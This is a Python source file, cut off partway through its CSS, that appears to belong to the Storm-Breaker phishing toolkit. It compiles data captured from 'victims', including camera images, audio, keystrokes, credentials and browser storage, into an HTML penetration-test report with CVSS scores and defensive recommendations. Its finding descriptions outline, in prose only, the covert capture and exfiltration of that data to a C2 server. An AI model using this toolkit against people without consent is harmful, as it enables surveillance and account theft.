"""
Storm-Breaker Report Generator v2.0
Generates professional HTML pentest reports from all captured data sources
Includes: CVSS scoring, methodology, executive summary, findings, evidence,
          risk matrix, timeline, recommendations, table of contents, database integration
"""

import os
import json
import base64
from datetime import datetime
from collections import defaultdict


BASE_DIR = os.path.dirname(__file__)


def gather_data():
    """Collect all data from the storm-web directories and database"""
    data = {
        'images': [],
        'audio': [],
        'fingerprints': [],
        'keystrokes': [],
        'sessions': [],
        'credentials': [],
        'clipboard': [],
        'network_scans': [],
        'social_media': [],
        'password_managers': [],
    }

    # Images
    img_dir = os.path.join(BASE_DIR, 'images')
    if os.path.exists(img_dir):
        for f in sorted(os.listdir(img_dir)):
            if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                fpath = os.path.join(img_dir, f)
                data['images'].append({
                    'filename': f,
                    'path': fpath,
                    'size': os.path.getsize(fpath),
                    'timestamp': datetime.fromtimestamp(os.path.getmtime(fpath)).isoformat(),
                })

    # Audio
    audio_dir = os.path.join(BASE_DIR, 'sounds')
    if os.path.exists(audio_dir):
        for f in sorted(os.listdir(audio_dir)):
            if f.lower().endswith(('.wav', '.mp3', '.ogg', '.webm')):
                fpath = os.path.join(audio_dir, f)
                data['audio'].append({
                    'filename': f,
                    'size': os.path.getsize(fpath),
                    'timestamp': datetime.fromtimestamp(os.path.getmtime(fpath)).isoformat(),
                })

    # Fingerprints
    fp_dir = os.path.join(BASE_DIR, 'fingerprints')
    if os.path.exists(fp_dir):
        for f in sorted(os.listdir(fp_dir)):
            if f.endswith('.json'):
                try:
                    with open(os.path.join(fp_dir, f), 'r') as fh:
                        fp_data = json.load(fh)
                        data['fingerprints'].append({
                            'filename': f,
                            'data': fp_data,
                            'timestamp': datetime.fromtimestamp(
                                os.path.getmtime(os.path.join(fp_dir, f))
                            ).isoformat(),
                        })
                except Exception:
                    pass

    # Keystrokes
    ks_dir = os.path.join(BASE_DIR, 'keystrokes')
    if os.path.exists(ks_dir):
        for f in sorted(os.listdir(ks_dir)):
            if f.endswith('.json'):
                try:
                    with open(os.path.join(ks_dir, f), 'r') as fh:
                        ks_data = json.load(fh)
                        data['keystrokes'].append({
                            'filename': f,
                            'data': ks_data,
                            'timestamp': datetime.fromtimestamp(
                                os.path.getmtime(os.path.join(ks_dir, f))
                            ).isoformat(),
                        })
                except Exception:
                    pass

    # Clipboard data
    clip_dir = os.path.join(BASE_DIR, 'clipboard')
    if os.path.exists(clip_dir):
        for f in sorted(os.listdir(clip_dir)):
            if f.endswith('.json'):
                try:
                    with open(os.path.join(clip_dir, f), 'r') as fh:
                        data['clipboard'].append({'filename': f, 'data': json.load(fh)})
                except Exception:
                    pass

    # Network scan results
    net_dir = os.path.join(BASE_DIR, 'network-scans')
    if os.path.exists(net_dir):
        for f in sorted(os.listdir(net_dir)):
            if f.endswith('.json'):
                try:
                    with open(os.path.join(net_dir, f), 'r') as fh:
                        data['network_scans'].append({'filename': f, 'data': json.load(fh)})
                except Exception:
                    pass

    # Social media data
    social_dir = os.path.join(BASE_DIR, 'social-media')
    if os.path.exists(social_dir):
        for f in sorted(os.listdir(social_dir)):
            if f.endswith('.json'):
                try:
                    with open(os.path.join(social_dir, f), 'r') as fh:
                        data['social_media'].append({'filename': f, 'data': json.load(fh)})
                except Exception:
                    pass

    # Password manager data
    pm_dir = os.path.join(BASE_DIR, 'password-managers')
    if os.path.exists(pm_dir):
        for f in sorted(os.listdir(pm_dir)):
            if f.endswith('.json'):
                try:
                    with open(os.path.join(pm_dir, f), 'r') as fh:
                        data['password_managers'].append({'filename': f, 'data': json.load(fh)})
                except Exception:
                    pass

    # Sessions
    session_dir = os.path.join(BASE_DIR, 'sessions')
    if os.path.exists(session_dir):
        for f in sorted(os.listdir(session_dir)):
            if f.endswith('.json'):
                try:
                    with open(os.path.join(session_dir, f), 'r') as fh:
                        data['sessions'].append({'filename': f, 'data': json.load(fh)})
                except Exception:
                    pass

    # Pull credentials from database if available
    try:
        import database as db
        creds = db.get_credentials() if hasattr(db, 'get_credentials') else []
        data['credentials'] = creds if isinstance(creds, list) else []
    except Exception:
        pass

    # Pull browser exfil from database
    try:
        import database as db
        exfil = db.get_browser_exfil() if hasattr(db, 'get_browser_exfil') else []
        data['browser_exfil'] = exfil if isinstance(exfil, list) else []
    except Exception:
        data['browser_exfil'] = []

    # Pull network discoveries from database
    try:
        import database as db
        discoveries = db.get_network_discoveries() if hasattr(db, 'get_network_discoveries') else []
        data['network_discoveries'] = discoveries if isinstance(discoveries, list) else []
    except Exception:
        data['network_discoveries'] = []

    return data


def get_cvss_score(finding_id):
    """Return CVSS v3.1 scores for known finding types"""
    scores = {
        'CAM-001': {'score': 8.6, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N', 'severity': 'High'},
        'MIC-001': {'score': 8.6, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N', 'severity': 'High'},
        'FP-001':  {'score': 6.5, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N', 'severity': 'Medium'},
        'KL-001':  {'score': 9.3, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N', 'severity': 'Critical'},
        'GEO-001': {'score': 6.1, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N', 'severity': 'Medium'},
        'CRED-001': {'score': 9.8, 'vector': 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'severity': 'Critical'},
        'CLIP-001': {'score': 5.3, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N', 'severity': 'Medium'},
        'EXFIL-001': {'score': 8.1, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N', 'severity': 'High'},
        'NET-001':  {'score': 5.8, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N', 'severity': 'Medium'},
        'SOCIAL-001': {'score': 6.5, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N', 'severity': 'Medium'},
    }
    return scores.get(finding_id, {'score': 5.0, 'vector': 'AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N', 'severity': 'Medium'})


def get_cwe_mapping(finding_id):
    """Map findings to CWE identifiers"""
    mappings = {
        'CAM-001': {'cwe': 'CWE-359', 'name': 'Exposure of Private Personal Information'},
        'MIC-001': {'cwe': 'CWE-359', 'name': 'Exposure of Private Personal Information'},
        'FP-001':  {'cwe': 'CWE-200', 'name': 'Exposure of Sensitive Information'},
        'KL-001':  {'cwe': 'CWE-522', 'name': 'Insufficiently Protected Credentials'},
        'GEO-001': {'cwe': 'CWE-359', 'name': 'Exposure of Private Personal Information'},
        'CRED-001': {'cwe': 'CWE-522', 'name': 'Insufficiently Protected Credentials'},
        'CLIP-001': {'cwe': 'CWE-200', 'name': 'Exposure of Sensitive Information'},
        'EXFIL-001': {'cwe': 'CWE-200', 'name': 'Exposure of Sensitive Information'},
        'NET-001':  {'cwe': 'CWE-200', 'name': 'Exposure of Sensitive Information'},
        'SOCIAL-001': {'cwe': 'CWE-359', 'name': 'Exposure of Private Personal Information'},
    }
    return mappings.get(finding_id, {'cwe': 'CWE-200', 'name': 'Information Exposure'})


def generate_report(config=None):
    """Generate a complete HTML pentest report"""
    if config is None:
        config = {}

    data = gather_data()
    report_title = config.get('title', 'Storm-Breaker Penetration Test Report')
    report_org = config.get('organization', 'Security Assessment Team')
    report_target = config.get('target', 'Target Organization')
    report_date = config.get('date', datetime.now().strftime('%Y-%m-%d'))
    report_author = config.get('author', 'Storm-Breaker Operator')
    classification = config.get('classification', 'CONFIDENTIAL')
    report_scope = config.get('scope', 'Social engineering assessment via browser-based attack vectors')

    # Compute stats
    total_victims = len(set([
        fp['data'].get('ip', fp['data'].get('basic', {}).get('ip', ''))
        for fp in data['fingerprints'] if fp.get('data')
    ]))
    total_images = len(data['images'])
    total_audio = len(data['audio'])
    total_fingerprints = len(data['fingerprints'])
    total_keystrokes = len(data['keystrokes'])
    total_credentials = len(data.get('credentials', []))
    total_clipboard = len(data.get('clipboard', []))
    total_browser_exfil = len(data.get('browser_exfil', []))
    total_network = len(data.get('network_discoveries', []))
    total_social = len(data.get('social_media', []))
    total_sessions = len(data.get('sessions', []))

    # Extract unique IPs, browsers, OSes
    ips = set()
    browsers = defaultdict(int)
    oses = defaultdict(int)
    geolocations = []
    for fp in data['fingerprints']:
        d = fp.get('data', {})
        basic = d.get('basic', d)
        ip = d.get('ip', basic.get('ip', ''))
        if ip:
            ips.add(ip)
        ua = basic.get('userAgent', '')
        if 'Chrome' in ua and 'Edg' not in ua:
            browsers['Chrome'] += 1
        elif 'Firefox' in ua:
            browsers['Firefox'] += 1
        elif 'Safari' in ua and 'Chrome' not in ua:
            browsers['Safari'] += 1
        elif 'Edg' in ua:
            browsers['Edge'] += 1
        elif 'Opera' in ua or 'OPR' in ua:
            browsers['Opera'] += 1
        elif ua:
            browsers['Other'] += 1
        plat = basic.get('platform', '')
        if plat:
            oses[plat] += 1
        # Collect geolocation
        geo = d.get('geolocation', d.get('geo', {}))
        if geo and (geo.get('latitude') or geo.get('lat')):
            geolocations.append({
                'ip': ip,
                'lat': geo.get('latitude', geo.get('lat')),
                'lng': geo.get('longitude', geo.get('lng', geo.get('lon'))),
                'accuracy': geo.get('accuracy', 'N/A'),
            })

    # Build findings
    findings = []
    finding_number = 1

    if total_images > 0:
        cvss = get_cvss_score('CAM-001')
        cwe = get_cwe_mapping('CAM-001')
        findings.append({
            'id': 'CAM-001', 'number': finding_number,
            'title': 'Unauthorized Camera Access',
            'severity': 'Critical', 'color': '#dc2626',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Successfully captured {total_images} camera image(s) from victim device(s) through browser-based social engineering. The victim granted camera permissions after being presented with a convincing pretext page.',
            'impact': 'Visual identification of the victim, their physical environment, and any sensitive information visible in frame. This data could be used for identity theft, blackmail, or physical security reconnaissance.',
            'steps_to_reproduce': '1. Deploy phishing page with camera permission request\n2. Victim visits URL and grants camera access\n3. Camera frames captured and exfiltrated to C2 server',
            'recommendation': '• Implement browser security policies restricting camera access to approved origins\n• Deploy Content Security Policy (CSP) headers with strict media permissions\n• Enable camera usage indicators at the OS level\n• Conduct user awareness training on permission prompts',
            'evidence_count': total_images,
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if total_audio > 0:
        cvss = get_cvss_score('MIC-001')
        cwe = get_cwe_mapping('MIC-001')
        findings.append({
            'id': 'MIC-001', 'number': finding_number,
            'title': 'Unauthorized Microphone Recording',
            'severity': 'Critical', 'color': '#dc2626',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Captured {total_audio} audio recording(s) from victim microphone(s). Recordings may contain conversations, meeting content, and ambient audio from the victim\'s environment.',
            'impact': 'Eavesdropping on private conversations, corporate meetings, and sensitive verbal communications. Audio intelligence gathering for social engineering escalation.',
            'steps_to_reproduce': '1. Deploy phishing page with microphone permission request\n2. Victim grants microphone access\n3. Audio stream captured and transmitted to C2',
            'recommendation': '• Restrict microphone access via browser security policies\n• Deploy endpoint detection to monitor audio device access\n• Implement hardware-level microphone kill switches\n• Train users to deny suspicious permission requests',
            'evidence_count': total_audio,
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if total_fingerprints > 0:
        cvss = get_cvss_score('FP-001')
        cwe = get_cwe_mapping('FP-001')
        findings.append({
            'id': 'FP-001', 'number': finding_number,
            'title': 'Comprehensive Device Fingerprinting',
            'severity': 'High', 'color': '#ea580c',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Collected {total_fingerprints} detailed device fingerprint(s) including browser type, OS version, screen resolution, GPU renderer (WebGL), installed plugins, canvas fingerprint, timezone, language preferences, and hardware concurrency.',
            'impact': 'Enables persistent tracking across sessions without cookies. Facilitates targeted exploit selection based on detected software versions. Canvas and WebGL fingerprints provide unique device identifiers.',
            'steps_to_reproduce': '1. Victim visits phishing page\n2. JavaScript fingerprinting code executes automatically\n3. Browser, hardware, and environment data collected\n4. Unique fingerprint hash generated for tracking',
            'recommendation': '• Deploy anti-fingerprinting browser extensions (e.g., Canvas Blocker)\n• Use browser isolation for sensitive operations\n• Standardize browser configurations across organization\n• Consider Tor Browser for high-risk browsing activities',
            'evidence_count': total_fingerprints,
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if total_keystrokes > 0:
        cvss = get_cvss_score('KL-001')
        cwe = get_cwe_mapping('KL-001')
        findings.append({
            'id': 'KL-001', 'number': finding_number,
            'title': 'Browser Keystroke Capture',
            'severity': 'Critical', 'color': '#dc2626',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Captured {total_keystrokes} keystroke log(s) including typed credentials, form inputs, search queries, and messages. Keystroke data may include plaintext passwords entered on the phishing page.',
            'impact': 'Direct exposure of authentication credentials, personal communications, financial data, and all keyboard input. Compromised credentials enable account takeover and lateral movement.',
            'steps_to_reproduce': '1. Phishing page includes invisible keylogger JavaScript\n2. All keystrokes on page captured in real-time\n3. Keystroke data batched and sent to C2 server\n4. Credential patterns extracted from keystroke stream',
            'recommendation': '• Implement CSP headers preventing inline script execution\n• Deploy browser-level XSS protection\n• Use hardware security keys (FIDO2/WebAuthn) for authentication\n• Consider virtual keyboards for sensitive credential entry\n• Enable MFA to limit credential theft impact',
            'evidence_count': total_keystrokes,
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if len(ips) > 0:
        cvss = get_cvss_score('GEO-001')
        cwe = get_cwe_mapping('GEO-001')
        findings.append({
            'id': 'GEO-001', 'number': finding_number,
            'title': 'Geolocation & IP Intelligence',
            'severity': 'High', 'color': '#ea580c',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Identified {len(ips)} unique victim IP address(es) and collected GPS coordinates from {len(geolocations)} device(s) via the Geolocation API. IP addresses reveal ISP, approximate location, and network infrastructure.',
            'impact': 'Physical location tracking of victims. Network infrastructure exposure. ISP and organization identification. Enables physical surveillance and targeted attacks.',
            'steps_to_reproduce': '1. Phishing page requests geolocation permission\n2. IP address recorded from HTTP request\n3. GPS coordinates collected via Geolocation API\n4. WebRTC local IP leak captured for internal network mapping',
            'recommendation': '• Use VPN services for all browsing\n• Disable geolocation API in browser settings\n• Block WebRTC to prevent local IP leaks\n• Deploy DNS-level filtering to block phishing domains',
            'evidence_count': len(ips),
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if total_credentials > 0:
        cvss = get_cvss_score('CRED-001')
        cwe = get_cwe_mapping('CRED-001')
        findings.append({
            'id': 'CRED-001', 'number': finding_number,
            'title': 'Harvested Authentication Credentials',
            'severity': 'Critical', 'color': '#dc2626',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Captured {total_credentials} set(s) of authentication credentials submitted via phishing forms. Credentials include usernames, passwords, and associated service identifiers.',
            'impact': 'Direct account compromise. Credential reuse attacks against other services. Privilege escalation through compromised accounts. Data breach via authorized access.',
            'steps_to_reproduce': '1. Victim presented with convincing login form\n2. Credentials submitted to phishing page\n3. Credentials captured and stored on C2 server\n4. Real login page optionally shown as redirect',
            'recommendation': '• Implement FIDO2/WebAuthn passwordless authentication\n• Deploy phishing-resistant MFA (hardware keys)\n• Use password managers with URL verification\n• Conduct regular credential breach monitoring\n• Enable login anomaly detection',
            'evidence_count': total_credentials,
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if total_browser_exfil > 0:
        cvss = get_cvss_score('EXFIL-001')
        cwe = get_cwe_mapping('EXFIL-001')
        findings.append({
            'id': 'EXFIL-001', 'number': finding_number,
            'title': 'Browser Data Exfiltration',
            'severity': 'High', 'color': '#ea580c',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Exfiltrated {total_browser_exfil} browser data item(s) including cookies, localStorage entries, sessionStorage, and autofill data from victim browsers.',
            'impact': 'Session hijacking via stolen cookies. Access to cached authentication tokens. Exposure of locally stored sensitive data. Cross-site data correlation.',
            'steps_to_reproduce': '1. JavaScript on phishing page accesses browser storage APIs\n2. Cookies, localStorage, and sessionStorage enumerated\n3. Data serialized and exfiltrated to C2 via fetch/XHR\n4. Session tokens extracted for account hijacking',
            'recommendation': '• Set HttpOnly and Secure flags on all session cookies\n• Implement SameSite cookie attributes\n• Minimize localStorage usage for sensitive data\n• Deploy CSP headers restricting outbound connections',
            'evidence_count': total_browser_exfil,
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if total_network > 0:
        cvss = get_cvss_score('NET-001')
        cwe = get_cwe_mapping('NET-001')
        findings.append({
            'id': 'NET-001', 'number': finding_number,
            'title': 'Internal Network Discovery',
            'severity': 'Medium', 'color': '#ca8a04',
            'cvss_score': cvss['score'], 'cvss_vector': cvss['vector'],
            'cwe': cwe['cwe'], 'cwe_name': cwe['name'],
            'description': f'Performed {total_network} network discovery scan(s) from victim browsers, revealing internal network topology, live hosts, and accessible services via WebRTC and port probing.',
            'impact': 'Internal network mapping from outside the perimeter. Identification of internal services and infrastructure. Attack surface enumeration for further exploitation.',
            'steps_to_reproduce': '1. JavaScript uses WebRTC to discover local/internal IPs\n2. Port scanning via Image/fetch timing side-channels\n3. Internal service detection through response analysis\n4. Network topology mapped and exfiltrated',
            'recommendation': '• Disable WebRTC or restrict to approved sites\n• Deploy network segmentation\n• Monitor for unusual internal scanning patterns\n• Use browser isolation for external web access',
            'evidence_count': total_network,
            'affected_assets': list(ips)[:5],
        })
        finding_number += 1

    if not findings:
        findings.append({
            'id': 'INFO-001', 'number': 1,
            'title': 'No Sensitive Data Captured',
            'severity': 'Info', 'color': '#6b7280',
            'cvss_score': 0.0, 'cvss_vector': 'N/A',
            'cwe': 'N/A', 'cwe_name': 'N/A',
            'description': 'No images, audio, fingerprints, keystrokes, or credentials were captured during this assessment period.',
            'impact': 'N/A',
            'steps_to_reproduce': 'N/A',
            'recommendation': 'Continue monitoring and testing. Review phishing page deployment and victim engagement.',
            'evidence_count': 0,
            'affected_assets': [],
        })

    # Calculate overall risk score
    if findings and findings[0]['id'] != 'INFO-001':
        max_cvss = max(f['cvss_score'] for f in findings)
        avg_cvss = sum(f['cvss_score'] for f in findings) / len(findings)
        overall_risk = round((max_cvss * 0.6 + avg_cvss * 0.4), 1)
    else:
        overall_risk = 0.0
        max_cvss = 0.0
        avg_cvss = 0.0

    # Build timeline
    timeline = []
    for fp in data['fingerprints']:
        timeline.append({
            'time': fp['timestamp'], 'type': 'Fingerprint', 'icon': '🔍',
            'detail': f"Device fingerprint captured: {fp['filename']}",
            'severity': 'medium',
        })
    for img in data['images']:
        timeline.append({
            'time': img['timestamp'], 'type': 'Camera', 'icon': '📸',
            'detail': f"Camera image: {img['filename']} ({img['size']} bytes)",
            'severity': 'critical',
        })
    for aud in data['audio']:
        timeline.append({
            'time': aud['timestamp'], 'type': 'Audio', 'icon': '🎤',
            'detail': f"Audio recording: {aud['filename']} ({aud['size']} bytes)",
            'severity': 'critical',
        })
    for ks in data['keystrokes']:
        timeline.append({
            'time': ks['timestamp'], 'type': 'Keystrokes', 'icon': '⌨️',
            'detail': f"Keystroke log: {ks['filename']}",
            'severity': 'critical',
        })
    for sess in data.get('sessions', []):
        timeline.append({
            'time': sess.get('data', {}).get('timestamp', datetime.now().isoformat()),
            'type': 'Session', 'icon': '🔗',
            'detail': f"Active session: {sess['filename']}",
            'severity': 'medium',
        })
    timeline.sort(key=lambda x: x['time'], reverse=True)

    # Total evidence count
    total_evidence = (total_images + total_audio + total_fingerprints +
                      total_keystrokes + total_credentials + total_clipboard +
                      total_browser_exfil + total_network + total_sessions)

    # Generate HTML
    html = _render_report_html(
        title=report_title,
        org=report_org,
        target=report_target,
        date=report_date,
        author=report_author,
        classification=classification,
        scope=report_scope,
        findings=findings,
        timeline=timeline[:100],
        overall_risk=overall_risk,
        max_cvss=max_cvss,
        stats={
            'victims': total_victims,
            'images': total_images,
            'audio': total_audio,
            'fingerprints': total_fingerprints,
            'keystrokes': total_keystrokes,
            'credentials': total_credentials,
            'clipboard': total_clipboard,
            'browser_exfil': total_browser_exfil,
            'network_discoveries': total_network,
            'sessions': total_sessions,
            'total_evidence': total_evidence,
            'unique_ips': len(ips),
            'ips': list(ips),
            'browsers': dict(browsers),
            'oses': dict(oses),
            'geolocations': geolocations[:20],
        },
    )

    return {
        'html': html,
        'stats': {
            'findings': len(findings),
            'critical': sum(1 for f in findings if f['severity'] == 'Critical'),
            'high': sum(1 for f in findings if f['severity'] == 'High'),
            'medium': sum(1 for f in findings if f['severity'] == 'Medium'),
            'total_evidence': total_evidence,
            'timeline_events': len(timeline),
            'overall_risk': overall_risk,
            'max_cvss': max_cvss,
        },
        'generated_at': datetime.now().isoformat(),
    }


def _render_report_html(title, org, target, date, author, classification, scope,
                         findings, timeline, overall_risk, max_cvss, stats):
    """Render the full HTML report with professional formatting"""

    severity_counts = defaultdict(int)
    for f in findings:
        severity_counts[f['severity']] += 1

    # Risk level label
    if overall_risk >= 8.0:
        risk_label, risk_color = 'CRITICAL', '#dc2626'
    elif overall_risk >= 6.0:
        risk_label, risk_color = 'HIGH', '#ea580c'
    elif overall_risk >= 4.0:
        risk_label, risk_color = 'MEDIUM', '#ca8a04'
    elif overall_risk > 0:
        risk_label, risk_color = 'LOW', '#16a34a'
    else:
        risk_label, risk_color = 'INFORMATIONAL', '#6b7280'

    # Table of Contents
    toc_html = '''
    <div style="background:white;border-radius:12px;padding:24px;box-shadow:0 2px 8px rgba(0,0,0,0.06);margin-bottom:30px;">
        <ol style="padding-left:20px;line-height:2.2;color:#1e293b;">
            <li><a href="#exec-summary" style="color:#3b82f6;text-decoration:none;">Executive Summary</a></li>
            <li><a href="#scope" style="color:#3b82f6;text-decoration:none;">Scope & Methodology</a></li>
            <li><a href="#stats" style="color:#3b82f6;text-decoration:none;">Assessment Statistics</a></li>
            <li><a href="#risk-matrix" style="color:#3b82f6;text-decoration:none;">Risk Matrix</a></li>
            <li><a href="#findings" style="color:#3b82f6;text-decoration:none;">Detailed Findings</a></li>
            <li><a href="#ips" style="color:#3b82f6;text-decoration:none;">Identified IP Addresses</a></li>
            <li><a href="#environment" style="color:#3b82f6;text-decoration:none;">Target Environment</a></li>
            <li><a href="#timeline" style="color:#3b82f6;text-decoration:none;">Event Timeline</a></li>
            <li><a href="#recommendations" style="color:#3b82f6;text-decoration:none;">Recommendations Summary</a></li>
        </ol>
    </div>'''

    # Findings HTML
    findings_html = ''
    for f in findings:
        affected = ', '.join(f.get('affected_assets', [])[:5]) or 'N/A'
        findings_html += f'''
        <div style="background:#fff;border-radius:12px;padding:28px;margin-bottom:24px;border-left:5px solid {f['color']};box-shadow:0 2px 8px rgba(0,0,0,0.06);" id="finding-{f['id']}">
            <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
                <h3 style="margin:0;font-size:18px;color:#1e293b;"><span style="color:#94a3b8;font-weight:400;">#{f['number']}</span> {f['id']}: {f['title']}</h3>
                <span style="background:{f['color']};color:white;padding:5px 14px;border-radius:20px;font-size:12px;font-weight:600;">{f['severity']}</span>
            </div>
            <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap;">
                <span style="background:#f1f5f9;color:#475569;padding:4px 10px;border-radius:6px;font-size:11px;font-weight:500;">CVSS v3.1: <strong>{f['cvss_score']}</strong></span>
                <span style="background:#f1f5f9;color:#475569;padding:4px 10px;border-radius:6px;font-size:11px;font-family:monospace;">{f['cvss_vector']}</span>
                <span style="background:#f1f5f9;color:#475569;padding:4px 10px;border-radius:6px;font-size:11px;">{f['cwe']}: {f['cwe_name']}</span>
            </div>
            <p style="color:#475569;margin-bottom:16px;line-height:1.7;">{f['description']}</p>
            <div style="background:#fef2f2;border-radius:8px;padding:16px;margin-bottom:12px;border-left:3px solid #dc2626;">
                <strong style="color:#dc2626;font-size:13px;">⚠️ Impact</strong>
                <p style="color:#64748b;margin:8px 0 0;line-height:1.6;">{f['impact']}</p>
            </div>
            <div style="background:#f8fafc;border-radius:8px;padding:16px;margin-bottom:12px;border-left:3px solid #6366f1;">
                <strong style="color:#6366f1;font-size:13px;">🔬 Steps to Reproduce</strong>
                <pre style="color:#64748b;margin:8px 0 0;line-height:1.6;white-space:pre-wrap;font-size:13px;">{f.get('steps_to_reproduce', 'N/A')}</pre>
            </div>
            <div style="background:#f0fdf4;border-radius:8px;padding:16px;margin-bottom:12px;border-left:3px solid #16a34a;">
                <strong style="color:#16a34a;font-size:13px;">✅ Recommendation</strong>
                <pre style="color:#64748b;margin:8px 0 0;line-height:1.6;white-space:pre-wrap;font-size:13px;">{f['recommendation']}</pre>
            </div>
            <div style="display:flex;justify-content:space-between;margin-top:12px;font-size:12px;color:#94a3b8;">
                <span>Evidence Items: {f['evidence_count']}</span>
                <span>Affected Assets: {affected}</span>
            </div>
        </div>'''

    # Timeline HTML
    timeline_html = ''
    severity_timeline_colors = {'critical': '#dc2626', 'high': '#ea580c', 'medium': '#ca8a04', 'low': '#16a34a'}
    for evt in timeline[:50]:
        color = severity_timeline_colors.get(evt.get('severity', 'medium'), '#64748b')
        timeline_html += f'''
        <div style="display:flex;align-items:flex-start;margin-bottom:14px;padding-left:20px;border-left:3px solid {color};">
            <span style="font-size:20px;margin-right:12px;min-width:28px;">{evt['icon']}</span>
            <div style="flex:1;">
                <div style="display:flex;justify-content:space-between;align-items:center;">
                    <span style="font-size:11px;color:#94a3b8;font-family:monospace;">{evt['time']}</span>
                    <span style="font-size:10px;padding:2px 8px;border-radius:10px;background:{color};color:white;">{evt['type']}</span>
                </div>
                <div style="font-size:13px;color:#334155;margin-top:4px;">{evt['detail']}</div>
            </div>
        </div>'''

    # IPs HTML
    ips_html = ''
    for ip in stats.get('ips', []):
        ips_html += f'<span style="background:#1e293b;color:#38bdf8;padding:5px 12px;border-radius:6px;font-family:monospace;font-size:12px;margin:3px;display:inline-block;">{ip}</span> '

    # Browsers HTML
    browsers_html = ''
    total_browser_count = sum(stats.get('browsers', {}).values()) or 1
    for browser, count in stats.get('browsers', {}).items():
        pct = round(count / total_browser_count * 100)
        browsers_html += f'''<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #f1f5f9;">
            <span style="color:#475569;">{browser}</span>
            <div style="display:flex;align-items:center;gap:8px;">
                <div style="background:#e2e8f0;border-radius:4px;height:8px;width:80px;"><div style="background:#3b82f6;border-radius:4px;height:8px;width:{pct}%;"></div></div>
                <strong style="color:#1e293b;min-width:40px;text-align:right;">{count} ({pct}%)</strong>
            </div>
        </div>'''

    # OS HTML
    os_html = ''
    for os_name, count in stats.get('oses', {}).items():
        os_html += f'<div style="display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #f1f5f9;"><span style="color:#475569;">{os_name}</span><strong style="color:#1e293b;">{count}</strong></div>'

    return f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{title}</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
    body {{ font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; background: #f8fafc; color: #1e293b; line-height: 1.6; }}
    .page {{ max-width: 920px; margin: 0 auto; padding: 40px 20px; }}
    .cover {{ background: linear-gradient(135deg, #0f172a 0%, #1e293b 40%, #334155 100%); color: white; padding: 80px 60px; border-radius: 16px; margin-bottom: 40px; text-align: center; position: relative; overflow: hidden; }}
    .cover::before {{ content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); }}
    .cover h1 {{ font-size: 32px; font-weight: 800; margin-bottom: 16px; position: relative; }}
    .cover .meta {{ font-size: 14px; opacity: 0.7; margin: 4px 0; position: relative; }}
    .cover .classification {{ display: inline-block; background: #dc2626; padding: 6px 24px; border-radius: 4px; font-weight: 700; font-size: 13px; letter-spacing: 2px; margin-top: 24px; position: relative; }}
    .cover .risk-badge {{ display: inline-block; background: {risk_color}; padding: 8px 20px; border-radius: 8px; font-weight: 700; font-size: 14px; margin-top: 12px; position: relative; }}
    .section {{ margin-bottom: 40px; }}
    .section h2 {{ font-size: 22px; font-weight: 700; color: #0f172a; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 2px solid #e2e8f0; }}
    .stat-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 14px; margin-bottom: 30px; }}
